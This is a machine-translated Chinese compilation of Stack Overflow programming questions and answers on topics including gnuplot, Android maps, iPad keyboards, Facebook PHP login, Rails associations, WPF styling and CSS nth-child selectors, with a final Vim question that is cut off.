## 回答 #1

> 赞同：16
> 
> 时间：2013-08-04T10:29:30.383

您可以在**gnuplot**`stats`中使用该命令，其语法类似于该命令：**`plot`**

 **`stats "file.dat" using 2:(f($2)) name "A"`

相关系数将存储在`A_correlation` 变量中。（没有名称规范，它将是`STATS_correlation`。）您可以随后使用它来绘制数据或使用以下`set label`命令在屏幕上打印：

`set label 1 sprintf("r = %4.2f",A_correlation) at graph 0.1, graph 0.85`

[您可以在gnuplot 文档](http://gnuplot.sourceforge.net/docs_4.6/gnuplot.pdf)中找到有关该`stats`命令的更多信息。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-23T18:00:12.987

尽管没有直接解决此问题的方法，但有一种变通方法是可能的。我将使用 python/numpy 来说明它。首先，生成拟合并与 python 脚本连接的 gnuplot 脚本部分：

```
 file = "my_data.tsv"
    f(x)=a+b*(x)
    fit f(x) file using 2:3 via a,b
    r = system(sprintf("python correlation.py %s",file)) 
    ti = sprintf("y = %.2f + %.2fx (r = %s)", a, b, r)
    plot \
      file using 2:3 notitle,\
      f(x) title ti 
```

这将运行相关性.py 以字符串格式检索相关性“r”。它使用 'r' 为拟合线生成标题。然后，correlation.py：

```
 from numpy import genfromtxt
    from numpy import corrcoef
    import sys
    data = genfromtxt(sys.argv[1], delimiter='\t')
    r = corrcoef(data[1:,1],data[1:,2])[0,1]
    print("%.3f" % r).lstrip('0') 
```

这里，假设第一行是标题行。此外，计算相关性的列现在被硬编码为 nr。1 和 2。当然，这两个设置都可以更改并转换为参数。

拟合线的结果标题是（作为个人示例）：

```
y = 2.15 + 1.58x (r = .592) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-07-19T06:22:28.373

由于您可能正在使用 fit 函数，因此您可以首先参考此[链接](http://computingnote.blogspot.com/2013/04/calculating-r2-with-gnuplot.html)以得出 R2 值。该链接使用某些现有变量（如 FIT_WSSR、FIT_NDF）来计算 R2 值。R2 的代码如下：

```
SST = FIT_WSSR/(FIT_NDF+1)
SSE=FIT_WSSR/(FIT_NDF)
SSR=SST-SSE
R2=SSR/SST 
```

下一步是在图表上显示 R^2 值。可以使用以下代码实现：

`set label 1 sprintf("r = %f",R2) at graph 0.7, graph 0.7`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-21T19:12:01.800

如果您正在寻找一种方法来计算[此页面上定义的相关系数](http://mathworld.wolfram.com/CorrelationCoefficient.html)，那么您使用 gnuplot 会很不走运，如此[Google Groups 线程](https://groups.google.com/forum/?fromgroups=#!topic/comp.graphics.apps.gnuplot/bX-sKHJaTEg)中所述。

还有许多其他用于计算相关系数的工具，例如[numpy](https://stackoverflow.com/questions/893657/how-do-i-calculate-r-squared-using-python-and-numpy)。**

# android - 替换 Android 版 Google 地图 V2 中的 ItemizedOverlay？

> ID：13957462
> 
> 赞同：6
> 
> 时间：2012-12-19T17:05:17.227
> 
> 标签：android, maps

在 Android 版 Google Maps V1 中，我使用 ItemizedOverlay 类实现了一种集群形式。每个集群都有一个中心点（纬度/经度）、半径（以英里为单位）和集群中的项目数。我使用 ItemizedOverlay.draw(Canvas, MapView, shadow) 使用 Canvas 对象方法（如 drawCircle() 和 drawText()）绘制集群。每个簇由一个包含计数的实心圆（大小根据计数所需的空间）和一个显示半径的圆组成。

在阅读了 V2 上的文档并使用演示应用程序后，我发现没有与 ItemizedOverlay 等效的东西，也没有明显的替代方案。我怀疑这样做的唯一方法是自己维护一个集群列表，然后将 MapView 子类化并提供其 onDraw() 方法的实现。

我是否错过了 V2 API 中比继承 MapView 更好的东西？

谢谢，

标记

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-25T11:17:24.580

经过一些研究，我也没有找到比动态创建标记位图更好的选择。但我也在地图上创建了带有多边形的圆圈。请注意，这并不是真正的高性能解决方案，但就我而言，这是一个不错的选择。代码示例：

```
private static final int CIRCLE_POLYGON_VERTICES = 16;
private static final double EARTH_RADIUS = 6378.1d;

private List<LatLng> createCirclePolygon(LatLng center, double r) {
    List<LatLng> res = new ArrayList<LatLng>(CIRCLE_POLYGON_VERTICES);

    double r_latitude = MathUtils.rad2deg(r/EARTH_RADIUS);
    double r_longitude = r_latitude / Math.cos(MathUtils.deg2rad(center.latitude));

    for (int point = 0; point < CIRCLE_POLYGON_VERTICES + 1; point++) {
         double theta = Math.PI * ((double)point / (CIRCLE_POLYGON_VERTICES / 2));
         double circle_x = center.longitude + (r_longitude * Math.cos(theta));  
         double circle_y = center.latitude + (r_latitude * Math.sin(theta));     

         res.add(new LatLng(circle_y, circle_x));
     }
     return res;
}   

private Bitmap getClusteredLabel(String cnt, Context ctx) {
    Resources r = ctx.getResources();
    Bitmap res = BitmapFactory.decodeResource(r, R.drawable.map_cluster_bg);        
    res = res.copy(Bitmap.Config.ARGB_8888, true);
    Canvas c = new Canvas(res);

    Paint textPaint = new Paint();
    textPaint.setAntiAlias(true);
    textPaint.setTextAlign(Paint.Align.CENTER);
    textPaint.setTypeface(Typeface.DEFAULT_BOLD);
    textPaint.setColor(Color.WHITE);
    textPaint.setTextSize(21);      

    c.drawText(String.valueOf(cnt), res.getWidth()/2, res.getHeight()/2 + textPaint.getTextSize() / 3, textPaint);

    return res;
}   

public void createClusteredOverlay(MapPinData point, GoogleMap map, Context ctx) {
    if (point.getCount() > 1) {
        map.addMarker(new MarkerOptions().position(point.getLatLng()).anchor(0.5f, 0.5f).icon(BitmapDescriptorFactory.fromBitmap(getClusteredLabel(String.valueOf(point.getCount()), ctx))));

        map.addPolygon(new PolygonOptions()         
        .addAll(createCirclePolygon(point.getLatLng(), point.getRadius()))
        .fillColor(Color.argb(50, 0, 0, 10))     
        .strokeWidth(0)
        );
    } else {
        map.addMarker(new MarkerOptions().position(point.getLatLng()).title(point.getTitle()));
    }
} 
```

我的 MathUtils 方法：

```
public static double deg2rad(double deg) {
    return (deg * Math.PI / 180.0);
}

public static double rad2deg(double rad) {
    return (rad * 180.0 / Math.PI);
} 
```

如果您的半径以英里为单位，则应将 EARTH_RADIUS 常量更改为英里，3963 AFAIK。

# objective-c - 在 iPad 中设置键盘属性

> ID：13957466
> 
> 赞同：0
> 
> 时间：2012-12-19T17:05:23.750
> 
> 标签：objective-c, ipad, cocoa-touch, keyboard

好的，我正在开发我的第一个 iPad 应用程序。是的，我是新手。尽管我使用的代码与用于 iPhone 的代码完全相同，但我在实现属性时遇到了许多问题。我认为这两个平台是（是）同一个 iOS？例如，我无法`UITextField`直接通过 Storyboard 或以编程方式设置键盘类型。这是我所做的：

1.  故事板

键盘=数字键盘

1.  以编程方式

标题

```
IBOutlet UITextField *txtValue;
@property (nonatomic, retain) UITextField *txtValue;

implementation

@synthesize txtValue;
txtValue.keyboardType = UIKeyboardTypeNumberPad; 
```

我也试过：

```
[txtValue setKeyboardType:UIKeyboardTypeNumberPad]; 
```

在屏幕和文件之间还有一个活动`IBOutlet`的，并且被选中。`UITextField``ViewController``ViewController``Connections Inspector``User Interaction enabled`

默认键盘绝对没有问题，只是它不是我想要的。知道这里发生了什么吗？谢谢...

我想我知道答案是什么，而且很愚蠢。答案是，iPad 上只有一个键盘。该属性仅在打开时设置配置。因此，如果您设置`Keyboard to NumberPad`，将打开相同的键盘并显示数字。不确定我喜欢这个。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T18:50:01.170

该键盘在 iPad 上不可用。

如果您不喜欢标准键盘，我建议您考虑创建自己的自定义键盘。以下是帮助您入门的文档：

[http://developer.apple.com/library/ios/#documentation/StringsTextFonts/Conceptual/TextAndWebiPhoneOS/InputViews/InputViews.html#//apple_ref/doc/uid/TP40009542-CH12-SW2](http://developer.apple.com/library/ios/#documentation/StringsTextFonts/Conceptual/TextAndWebiPhoneOS/InputViews/InputViews.html#//apple_ref/doc/uid/TP40009542-CH12-SW2)

综合考虑，自定义 iOS 键盘并不像听起来那么难。这只是另一个自定义视图。最困难的部分是制作一些图形以使其看起来像您想要的那样。

如果自定义路线不是您想要的，那么人们已经制作了几个“自定义”键盘。结帐 github 或 CocoaControls。这只是某人为 iPad 制作的自定义数字键盘的一个示例：

[https://github.com/azu/NumericKeypad](https://github.com/azu/NumericKeypad)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T18:00:36.460

NumberPad 不是 iPad 上支持的类型。

（命令/苹果点击 UIKeyboardTypeNumberPad 查看更多信息）

# xcode - 从项目中创建 XCode 4 lib

> ID：13957468
> 
> 赞同：0
> 
> 时间：2012-12-19T17:05:39.413
> 
> 标签：xcode, compilation, static-libraries

我有一个包含几个类的项目。现在我想要两个库，一个完全用于一个类，一个包含两个类。因此，我添加了两个新产品“libA.a”和“libB.a”在我选择作为目标“libA.a”或“libB.a”的类 m 文件中

它告诉我，它将库放在一个文件夹中。但是这个文件夹是空的。

谁能告诉我一步一步的解释，这是怎么可能的。（我也尝试为静态库创建一个新产品，只添加了这个类并且它可以编译，但我在任何地方都找不到这个 lib-File）。

所以基本问题：我在哪里可以找到教程，如何创建一个库（仅适用于 iPhone，不适用于模拟器或通用等...）。URL，...任何帮助表示赞赏。或者任何人都可以告诉我我缺少的步骤，我还需要做其他事情吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T09:21:39.893

好吧，解决方案非常简单......开始编译时，可以选择播放停止按钮旁边的目标。工具栏看起来像这样。

播放停止目标设备

单击目标，选择 LibA，按“播放”（=编译），它就可以工作了。LibB 也一样。

# javascript - 任何网站的 Javascript 自动填充条目

> ID：13957469
> 
> 赞同：0
> 
> 时间：2012-12-19T17:05:47.730
> 
> 标签：javascript, html, fill

我有简单的 HTML/Javascript 知识，我正在尝试创建一个自动填充脚本，因此当用户单击我网页上的链接时，它会打开该链接并自动输入/填充该网站的用户名和密码文本框。

如果我检查元素，我可以看到该网站的那些文本框的 ID，但我不知道访问网站并填写字段的代码。我不熟悉 JQuery，我只知道 Javascript、VB 和 HTML。我是 Java 新手，但我正在学习。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T23:21:04.500

由于[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)对策，这可能是不可能的，它可以防止您将代码从不同的来源注入到网站中。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-19T23:17:09.263

尝试 html5 占位符属性[http://davidwalsh.name/html5-placeholder](http://davidwalsh.name/html5-placeholder)。我相信这就是你要找的。

# cocoa-touch - 在将 UIView 添加到 superview 之前设置它的 alpha

> ID：13957473
> 
> 赞同：0
> 
> 时间：2012-12-19T17:05:55.733
> 
> 标签：cocoa-touch, uiview, uiview-hierarchy

我有两个视图，一个指定的超级视图和一个子视图。子视图的 alpha 值为 0，并且仅被初始化并没有被添加到任何父视图中。在我的子视图配置后，我声明了一个 UIView 动画块。有了这个，我在不到一秒的时间内将子视图的 alpha 更改为 1.0。

在我声明动画后，我将子视图添加到我的超级视图 X。

动画是否有可能不会发生——如果是，为什么？

```
[UIView animateWithDuration:0.3 animations:^(void) {
        [aSubview setAlpha:1.0];
}];

[aSuperview addSubview:aSubview]; 
```

# php - 使用 facebook 登录无法正常工作

> ID：13957479
> 
> 赞同：2
> 
> 时间：2012-12-19T17:06:18.027
> 
> 标签：php, facebook, login, facebook-php-sdk, facebook-authentication

我正在使用 facebook api 在我的网站上使用 facebook 的登录功能。但是它有一个问题，登录后它没有重定向到我的网站。它重定向到 facebook 主页。我不知道为什么会这样。我的代码如下：

此文件名为 logign_facebook.php

```
<?php

require 'facebook/facebook.php';
require 'config/fbconfig.php';
require 'config/functions.php';

$facebook = new Facebook(array(
            'app_id' => APP_ID,
            'app_seceret' => APP_SECRET,
            ));

$user = $facebook->getUser();

if ($user) {
  try {
    // Proceed knowing you have a logged in user who's authenticated.
    $user_profile = $facebook->api('/me');
  } catch (FacebookApiException $e) {
    error_log($e);
    $user = null;
  }

    if (!empty($user_profile )) {
        # User info ok? Let's print it (Here we will be adding the login and registering routines)

        $username = $user_profile['name'];
             $uid = $user_profile['id'];
         $email = $user_profile['email'];
        $user = new User();
        $userdata = $user->checkUser($uid, 'facebook', $username,$email,$twitter_otoken,$twitter_otoken_secret);
        if(!empty($userdata)){
            session_start();
            $_SESSION['id'] = $userdata['id'];
 $_SESSION['oauth_id'] = $uid;

            $_SESSION['username'] = $userdata['username'];
            $_SESSION['email'] = $email;
            $_SESSION['oauth_provider'] = $userdata['oauth_provider'];
            header("Location: home.php");
        }
    } else {
        # For testing purposes, if there was an error, let's kill the script
        die("There was an error.");
    }
} else {
    # There's no active session, let's generate one
    $login_url = $facebook->getLoginUrl(array( 'scope' => 'email'));
    header("Location: " . $login_url);
}
?> 
```

请帮我解决这个问题。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:26:23.813

Facebook 需要知道用户登录后重定向回的 URL。

您可以通过PHP SDK 中的**getLoginUrl()函数将其传递，如下所示：**

```
$login_url = $facebook->getLoginUrl(array(
    'redirect_uri' => 'http://yoururlhere.com/logign_facebook.php',
    'scope'        => array('email')
)); 
```

此函数的完整参数列表可在[https://developers.facebook.com/docs/reference/php/facebook-getLoginUrl](https://developers.facebook.com/docs/reference/php/facebook-getLoginUrl)中查看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T18:37:56.707

另一种解决方案：

[https://developers.facebook.com/apps/](https://developers.facebook.com/apps/)

应用>>[app_name]>>基本

并向下滚动到“使用 Facebook 登录的网站”

在文本字段中输入所需的 URL。

# ruby-on-rails - has_one 通过有很多

> ID：13957482
> 
> 赞同：0
> 
> 时间：2012-12-19T17:06:31.553
> 
> 标签：ruby-on-rails

您好，请任何人帮助我与协会？我有一篇带有一个预览图像和许多文章图像的文章。图像可用于许多文章。所以我的模型是：

```
class Article 
  has_many :article_images
  has_many :main_images, :class_name => "Image", :through => :article_images
  has_one  :preview_image, :class_name => "Image", :through => :article_images
end

class ArticleImage
  belongs_to :article
  belongs_to :preview_image, :class_name => "Image", :foreign_key => :image_id, :conditions => ["images.itype = 'preview_image'"]
  belongs_to :main_image, :class_name => "Image", :foreign_key => :image_id, :conditions => ["images.itype = 'main_image'"]
end

class Image < ActiveRecord::Base
  has_many :article_images
  has_many :articles
end 
```

问题是使用这段代码我得到了错误：

```
ActiveRecord::HasOneThroughCantAssociateThroughCollection: Cannot have a has_one :through association 'Article#preview_image' where the :through association 'Article#article_images' is a collection. Specify a has_one or belongs_to association in the :through option instead 
```

如果我在文章中为 preview_image 创建一个新关联，如下所示：

```
has_one :article_image
has_one  :preview_image, :class_name => "Image", :through => :article_image 
```

似乎无法正常工作。有人可以建议我一个解决方案吗

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:12:20.957

我会`preview`在桌子上做一列`article_images`。然后做：

```
class Article 
  has_many :article_images
  has_one  :preview_image, :class_name => "ArticleImage", :conditions => {:preview => true}
end

class ArticleImage
  belongs_to :Article
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:27:58.603

您的“ArticleImage”似乎不正确。它既属于“预览图像”又属于“主图像”，当它应该有一个图像（任何类型）时。该模型有意义的唯一方法是添加一些约束，即这两个属性中的一个且只有一个具有值，而另一个为空。

另外，您在 ArticleImage 中有更多属性吗？为什么要为预览图像创建一个 :through 关联？为什么不做：

```
class Article 
  has_many :article_images
  has_many :main_images, :class_name => "Image", :through => :article_images
  belongs_to  :preview_image, :class_name => "Image"
end 
```

并且在这个类中有唯一的预览图像的外键？

# c# - 使 WPF 按钮看起来不那么平坦

> ID：13957487
> 
> 赞同：5
> 
> 时间：2012-12-19T17:06:49.947
> 
> 标签：c#, wpf, xaml, button, templating

我的表单上有 2 个按钮，它们看起来都非常非常扁平。

![扁平按钮](../Images/081117e587b0c291ac0a3e0ba6ea39f6.png)

我似乎找不到让它们看起来更像的方法：

![非平面按钮](../Images/231910f0afb6f27723309a5afb4ed5e6.png)

我的按钮的 XAML 是：

```
<Button x:Name="bttnDailyReport" HorizontalAlignment="Left" Margin="618,27,0,0" VerticalAlignment="Top" Width="121" Height="93" FontFamily="Microsoft Sans Serif" FontSize="20" FontWeight="Bold" Grid.Column="1" BorderBrush="Black">
    <TextBlock HorizontalAlignment="Center" VerticalAlignment="Center"><Run Text="  Generate"/><LineBreak/><Run Text="Daily Report"/></TextBlock>
</Button>
<Button x:Name="bttnCancel" HorizontalAlignment="Left" Margin="618,126,0,0" VerticalAlignment="Top" Width="121" Height="93" FontFamily="Microsoft Sans Serif" FontSize="20" FontWeight="Bold" Click="BttnCancelClick">
    <TextBlock HorizontalAlignment="Center" VerticalAlignment="Center"><Run Text="Exit"/></TextBlock>
</Button> 
```

现在，我的问题是，是否可以让按钮看起来像 WinForms 中的按钮，或者我是否坚持使用平面按钮？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:13:05.403

似乎，在您的资源中，平面按钮样式被用作按钮的默认样式。

检查[样式和模板](http://msdn.microsoft.com/fr-fr/library/ms745683%28v=VS.85%29.aspx#styling_targettype)。您需要覆盖按钮中的样式，或者为默认样式提供密钥，并在需要的地方应用。

[如何覆盖全局样式（没有 x:Key），或者将命名样式应用于所有以类型为目标的控件？](https://stackoverflow.com/questions/1303634/how-to-override-a-global-style-that-doesnt-have-an-xkey-or-alternatively-ap)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-08-18T13:04:44.980

只需`PresentationFramework.Aero.dll`在您的项目中引用并将此代码添加到窗口的 XAML：

```
<Window.Resources>
    <ResourceDictionary>
        <ResourceDictionary.MergedDictionaries>
            <ResourceDictionary Source="/PresentationFramework.Aero;component/themes/aero.normalcolor.xaml" />
        </ResourceDictionary.MergedDictionaries>
    </ResourceDictionary>
</Window.Resources> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T20:45:17.153

默认情况下，按钮应该看起来像第二个图像。为确保没有“BoringButton”样式使您的按钮看起来很扁平（正如 Tilak 和 Chris W 建议的那样），请尝试像这样明确清除按钮的样式：

```
<Button x:Name="bttnDailyReport" Style="{x:Null}" > 
```

另外，不要将按钮的背景设置为特定颜色（尽管在您发布的代码中已经看起来不错）。

# filepicker.io - filepicker.io - 转换（）和存储与 FPUrl 转换

> ID：13957492
> 
> 赞同：5
> 
> 时间：2012-12-19T17:07:15.563
> 
> 标签：filepicker.io

我有一个应用程序，用户可以在其中上传图像，并且它必须提供三种不同尺寸（缩略图、中等尺寸、全尺寸）。我的用户不需要修改图像。

似乎有两种选择：

选项 1：只要我想显示缩略图，就使用图像转换 url。前任。[https://www.filepicker.io/api/file/hFHUCB3iTxyMzseuWOgG/convert?w=200&h=250](https://www.filepicker.io/api/file/hFHUCB3iTxyMzseuWOgG/convert?w=200&h=250)

选项 2：使用 convert() 和 store 将缩略图存储在 S3 中。

我的问题是我可以使用选项 1 吗？这将如何影响性能？转换后的文件是否缓存在 filepicker.io 的末尾，或者每次用户浏览器点击转换 url 时 filepicker 是否转换图像？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-20T00:40:15.340

转换后的文件在我们端缓存，因此完全支持使用转换 url。如果您提前知道您想要的尺寸并且认为您不需要品种，您也可以使用 .convert() 调用来“预缓存”转换，但这更多的是一种风格偏好而不是巨大的性能差异

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-20T07:52:26.993

实际上，使用 Javascript .convert() 方法和使用 /convert REST url 之间有一个非常重要的区别。

每次调用 .convert() 时，都会用完帐户中的一个上传积分，而使用 /convert url 方法会使用其中一个转换积分……并且帐户的转换积分比上传积分多得多。

因此，在可能的情况下，使用 /convert 网址要便宜得多。

# java - 无法在 Maven2 中导入 Commons DbUtils

> ID：13957495
> 
> 赞同：0
> 
> 时间：2012-12-19T17:07:24.060
> 
> 标签：java, maven-2

我正在尝试将 Commons DbUtils 添加到 Maven2，但我遇到了这个问题：

> 缺少工件 commons-dbutils:commons-dbutils:jar:1.6

我该如何导入它？

我的 pom.xml：

```
 **<dependency>
            <groupId>commons-dbutils</groupId>
            <artifactId>commons-dbutils</artifactId>
            <version>1.6</version>
        </dependency>** 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:10:25.023

从外观上看，DBUtils 1.6 不在主 MVN 存储库中。

原因是最新版本似乎是1.5！

见： [http ://commons.apache.org/dbutils/download_dbutils.cgi](http://commons.apache.org/dbutils/download_dbutils.cgi)

试试这个：

```
<dependency>
    <groupId>commons-dbutils</groupId>
    <artifactId>commons-dbutils</artifactId>
    <version>1.5</version>
</dependency> 
```

# html - css :nth-child() :after

> ID：13957498
> 
> 赞同：31
> 
> 时间：2012-12-19T17:07:29.690
> 
> 标签：html, css, css-selectors

可以混合`:nth-child()`和`after`吗？

我有一个`<ol>`项目，我想添加一些文本`:after`。这很好用，但我想在第 1、第 2 和第 3 项以及第 4、第 5 和第 6 项上有不同的文本。

使用下面的代码，我最终`li`会在它后面加上粉红色的“大”。

这对我来说没有意义，但是我对这个恶意软件很`nth-child`陌生。

**数据.html**

```
<ol id="id" class="ui-sortable">
    <li>
        <p>Bacon</p>
    </li>
    <li>
        <p>Bacon</p>
    </li>
    <li>
        <p>Bacon</p>
    </li>

    <!.. repeats -->

    <li>
        <p>Bacon</p>
    </li>
</ol> 
```

**漂亮的.css**

```
#id li p:after {
    float: right;
    content: 'nom';
}

#id li p:nth-child(1):after,
#id li p:nth-child(2):after,
#id li p:nth-child(3):after {
    content: 'OM';
    color: pink;
}

#id li p:nth-child(4):after,
#id li p:nth-child(5):after,
#id li p:nth-child(6):after {
    content: 'Nom';
    color: blue;
} 
```

我真的不想用 js 来做这件事，因为它只是一个“很高兴拥有”的功能。

我只担心新的浏览器，所以不需要 oldIE 等的解决方法。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-12-19T17:10:42.870

你可以，但你做错了..

你所有的`p`元素都在里面的问题`li`。所以他们都是他们`li`容器的第一个孩子。

您需要将 放在`nth-child`元素上`li`。

```
#id li:nth-child(1) p:after,
#id li:nth-child(2) p:after,
#id li:nth-child(3) p:after {
    content: 'OM';
    color: pink;
}

#id li:nth-child(4) p:after,
#id li:nth-child(5) p:after,
#id li:nth-child(6) p:after {
    content: 'Nom';
    color: blue;
} 
```

* * *

引用[W3C 文档](http://www.w3.org/TR/selectors/#nth-child-pseudo)

> `:nth-child(an+b)`伪类表示法表示在文档树中**它之前有一个+b-1 个兄弟**元素的元素，对于 n 的任何正整数或零值，并且有一个父元素。

* * *

**更新 1**

您也可以通过使用来简化这一点

```
#id li:nth-child(-n+3) p:after {
    content: 'OM';
    color: pink;
}

#id li:nth-last-child(-n+3) p:after { /*this means last 3*/
    content: 'Nom';
    color: blue;
} 
```

演示在[http://jsfiddle.net/gaby/4H4AS/2/](http://jsfiddle.net/gaby/4H4AS/2/)

* * *

**更新 2**

如果您只希望前六个不同（*而不是前 3 和后 3*），您可以

```
#id li:nth-child(-n+6) p:after { /*this means first 6*/
    content: 'Nom';
    color: blue;
}

#id li:nth-child(-n+3) p:after {/*this means first 3 and since it comes second it has precedence over the previous for the common elements*/
    content: 'OM';
    color: pink;
} 
```

演示在[http://jsfiddle.net/gaby/4H4AS/3/](http://jsfiddle.net/gaby/4H4AS/3/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-19T17:10:22.880

应该这样做：

```
#id li:nth-child(1) p:after,
#id li:nth-child(2) p:after,
#id li:nth-child(3) p:after {
    content: 'OM';
    color: pink;
}
#id li:nth-child(4) p:after,
#id li:nth-child(5) p:after,
#id li:nth-child(6) p:after {
    content: 'Nom';
    color: blue;
} 
```

[**JS小提琴**。](http://jsfiddle.net/4H4AS/)

...`<p>`始终是`<li>`所示 HTML 结构中的第一个子级。

但请注意，`content: 'nom';`第一个样式定义中的规则已被覆盖（但 'float' 规则仍然存在）：对于 ':after' 伪元素和其他伪元素的级联规则相同。)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-05-26T21:16:04.570

你可以像这样组合psudeos......

```
#id li:nth-child(1)::before {
    border-left-color: red;
}
#id li:nth-child(2)::before {
    border-left-color: white;
}
#id li:nth-child(3)::before {
    border-left-color: blue;
} 
```

# android - 无法以随机顺序恢复活动

> ID：13957501
> 
> 赞同：5
> 
> 时间：2012-12-19T17:07:36.337
> 
> 标签：android, opencv

安卓平台 4.0.4 Opencv 2.4.3

我正在尝试从相机获取快照，然后使用 opencv 处理它！但有时（以随机顺序）我收到以下异常

```
12-19 18:54:33.659: E/AndroidRuntime(16625): FATAL EXCEPTION: main
12-19 18:54:33.659: E/AndroidRuntime(16625): java.lang.RuntimeException: Unable to resume activity {com.example.superemr/com.example.superemr.MainActivity}: java.lang.RuntimeException: Failure delivering result ResultInfo{who=null, request=11, result=-1, data=Intent { act=inline-data dat=file:///mnt/sdcard/Pictures/IDSMART/IDS-1607435583.jpg typ=image/jpeg (has extras) }} to activity {com.example.superemr/com.example.superemr.MainActivity}: java.lang.NullPointerException
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2464)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2492)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1997)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.handleRelaunchActivity(ActivityThread.java:3371)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.access$700(ActivityThread.java:127)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1162)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.os.Handler.dispatchMessage(Handler.java:99)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.os.Looper.loop(Looper.java:137)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.main(ActivityThread.java:4441)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at java.lang.reflect.Method.invokeNative(Native Method)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at java.lang.reflect.Method.invoke(Method.java:511)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at dalvik.system.NativeStart.main(Native Method)
12-19 18:54:33.659: E/AndroidRuntime(16625): Caused by: java.lang.RuntimeException: Failure delivering result ResultInfo{who=null, request=11, result=-1, data=Intent { act=inline-data dat=file:///mnt/sdcard/Pictures/IDSMART/IDS-1607435583.jpg typ=image/jpeg (has extras) }} to activity {com.example.superemr/com.example.superemr.MainActivity}: java.lang.NullPointerException
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.deliverResults(ActivityThread.java:3000)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2451)
12-19 18:54:33.659: E/AndroidRuntime(16625):    ... 13 more
12-19 18:54:33.659: E/AndroidRuntime(16625): Caused by: java.lang.NullPointerException
12-19 18:54:33.659: E/AndroidRuntime(16625):    at com.example.superemr.MainActivity.onActivityResult(MainActivity.java:88)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.Activity.dispatchActivityResult(Activity.java:4649)
12-19 18:54:33.659: E/AndroidRuntime(16625):    at android.app.ActivityThread.deliverResults(ActivityThread.java:2996)
12-19 18:54:33.659: E/AndroidRuntime(16625):    ... 14 more 
```

当我尝试调试问题时，通常程序会成功，但有时会在 onResume 被调用之前抛出异常！

```
public void onResume()
{
    super.onResume();
    if(!OpenCVLoader.initAsync(OpenCVLoader.OPENCV_VERSION_2_4_3, this, mLoaderCallback))
        Toast.makeText(this, "cannot connect to opencv ",Toast.LENGTH_SHORT).show();
}

public void cap(View view)
{
    Intent camInt = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
      List<ResolveInfo> aa = getPackageManager().queryIntentActivities(
        camInt, PackageManager.MATCH_DEFAULT_ONLY);

      if (aa != null && aa.size() > 0) {
       File dir = new File(
         android.os.Environment
           .getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES),
         "IDSMART");

       if (!dir.exists()) {
        boolean result = dir.mkdirs();
        Log.d("Creating Dirs Result:",
          result ? "Create have been Done :)"
            : "Create have not been done :(");
       }
       Random r =  new Random();
       file = new File(dir, String.format("IDS%s.jpg", r.nextInt()));
       camInt.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(file));
       startActivityForResult(camInt, CAPTURE_IMAGE_ACTIVITY_REQUEST_CODE);
      }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T16:28:03.543

在您的`onActivityResult`中，请检查数据（意图）是否为空。如果您在尝试访问数据时
得到,。 尝试遵循 if 条件。`NullPointerException`

```
void onActivityResult(int requestCode, int resultCode, Intent data) 
{

      if( (resultCode == Activity.RESULT_OK) && (data != null)) 
      {
                 // Do whatever you want here.

      }
} 
```

# vim - VIM：覆盖系统 vimrc

> ID：13957502
> 
> 赞同：2
> 
> 时间：2012-12-19T17:07:38.273
> 
> 标签：vim, overwrite

我在多个 MAC OS X 系统上工作，这些系统在注销后不保存更改。如您所知，每台新 Mac 上都有 VIM，只需在终端中输入 vim 即可。我总是带着我的 vimrc 文件，问题是每次我启动 vim 时我都必须用`:so`命令加载它。

